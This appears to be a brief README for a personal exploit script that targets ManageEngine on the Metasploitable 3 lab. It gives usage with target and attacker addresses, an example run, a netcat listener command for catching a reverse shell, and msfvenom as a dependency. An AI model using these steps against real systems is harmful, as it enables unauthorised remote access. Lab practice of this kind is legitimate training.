Hey! This is the exploit I used to crack ManageEngine version 90084. 

Usage: ./manage-engine-exploit.py <TARGET> + <TARGET_PORT> + <ATTACKER_IP> + <ATTACKER_PORT>

For example: ./manageengine-exploit.py 192.168.55.229 8022 10.0.0.35 5555

Make sure your netcat listener is running! (nc -lvnp 5555)

I made this specifically for Metasploitable 3 but you could theoretically use other payloads for your needs (the script would likely need a lot of modification).

It depends on psutil (through pip) and msfvenom (through metasploit).
